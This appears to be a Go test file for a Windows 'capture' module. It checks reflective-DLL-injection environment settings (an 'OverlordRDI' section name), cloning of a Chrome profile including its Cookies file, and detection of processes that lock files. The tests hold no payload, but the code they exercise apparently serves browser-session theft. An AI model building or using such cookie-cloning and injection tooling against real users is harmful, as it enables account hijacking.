//go:build windows

package capture

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"syscall"
	"testing"
)

func TestAppendEnvironmentOverridesPreservesUnicodeAndReplacesRDI(t *testing.T) {
	raw := testEnvironmentBlock(t,
		"=C:=C:\\Users\\tester",
		"Path=C:\\Windows\\System32",
		"RDI_SEARCH_PATH=C:\\stale",
		"rdi_dll_size=not-a-number",
		"USERNAME=Jose\u0301",
	)

	block, err := appendEnvironmentOverrides(raw, []string{
		"RDI_SEARCH_PATH=C:\\Users\\\u6d4b\u8bd5\\Profile",
		"RDI_REPLACE_PATH=D:\\Clone\\\u590d\u5236",
		"RDI_DLL_SECTION=Local\\OverlordRDI_123",
		"RDI_DLL_SIZE=12345",
	})
	if err != nil {
		t.Fatalf("appendEnvironmentOverrides: %v", err)
	}
	if len(block) < 2 || block[len(block)-1] != 0 || block[len(block)-2] != 0 {
		t.Fatalf("environment block is not double-NUL terminated: tail=%v", block[max(0, len(block)-4):])
	}

	entries, err := environmentBlockEntries(block)
	if err != nil {
		t.Fatalf("environmentBlockEntries: %v", err)
	}

	for _, stale := range []string{"RDI_SEARCH_PATH=C:\\stale", "rdi_dll_size=not-a-number"} {
		if slices.Contains(entries, stale) {
			t.Fatalf("stale RDI entry was preserved: %q in %#v", stale, entries)
		}
	}

	for _, want := range []string{
		"=C:=C:\\Users\\tester",
		"USERNAME=Jose\u0301",
		"RDI_SEARCH_PATH=C:\\Users\\\u6d4b\u8bd5\\Profile",
		"RDI_REPLACE_PATH=D:\\Clone\\\u590d\u5236",
		"RDI_DLL_SIZE=12345",
	} {
		if !slices.Contains(entries, want) {
			t.Fatalf("missing environment entry %q in %#v", want, entries)
		}
	}
}

func TestCloneBrowserProfileProgressPanicDoesNotAbortCopy(t *testing.T) {
	src := t.TempDir()
	if err := os.WriteFile(filepath.Join(src, "Local State"), []byte("state"), 0600); err != nil {
		t.Fatalf("write Local State: %v", err)
	}
	profileDir := filepath.Join(src, "Default")
	if err := os.MkdirAll(profileDir, 0700); err != nil {
		t.Fatalf("mkdir profile: %v", err)
	}
	if err := os.WriteFile(filepath.Join(profileDir, "Cookies"), []byte("cookies"), 0600); err != nil {
		t.Fatalf("write Cookies: %v", err)
	}
	if err := os.WriteFile(filepath.Join(profileDir, "LOCK"), []byte("lock"), 0600); err != nil {
		t.Fatalf("write LOCK: %v", err)
	}
	if err := os.WriteFile(filepath.Join(profileDir, "lockfile"), []byte("lockfile"), 0600); err != nil {
		t.Fatalf("write lockfile: %v", err)
	}
	var statuses []string

	cloneDir, err := cloneBrowserProfile("Chrome", src, false, func(percent int, copiedBytes, totalBytes int64, status string) {
		statuses = append(statuses, status)
		if status == "cloning" || percent == 100 {
			panic("progress callback failed")
		}
	})
	if err != nil {
		t.Fatalf("cloneBrowserProfile: %v", err)
	}
	if !slices.ContainsFunc(statuses, func(status string) bool {
		return strings.HasPrefix(status, "copying|")
	}) {
		t.Fatalf("clone progress did not report current copy file: %#v", statuses)
	}

	if got, err := os.ReadFile(filepath.Join(cloneDir, "Local State")); err != nil || string(got) != "state" {
		t.Fatalf("cloned Local State = %q, %v", got, err)
	}
	if got, err := os.ReadFile(filepath.Join(cloneDir, "Default", "Cookies")); err != nil || string(got) != "cookies" {
		t.Fatalf("cloned Cookies = %q, %v", got, err)
	}
	for _, skipped := range []string{"LOCK", "lockfile"} {
		if _, err := os.Stat(filepath.Join(cloneDir, "Default", skipped)); !os.IsNotExist(err) {
			t.Fatalf("lock file %s should not be cloned; stat err=%v", skipped, err)
		}
	}
}

func TestGetProcessesLockingFileShortPathDoesNotPanic(t *testing.T) {
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("getProcessesLockingFile panicked for short path: %v", r)
		}
	}()

	_ = getProcessesLockingFile("a")
}

func testEnvironmentBlock(t *testing.T, entries ...string) []uint16 {
	t.Helper()

	var block []uint16
	for _, entry := range entries {
		u, err := syscall.UTF16FromString(entry)
		if err != nil {
			t.Fatalf("UTF16FromString(%q): %v", entry, err)
		}
		block = append(block, u...)
	}
	return append(block, 0)
}
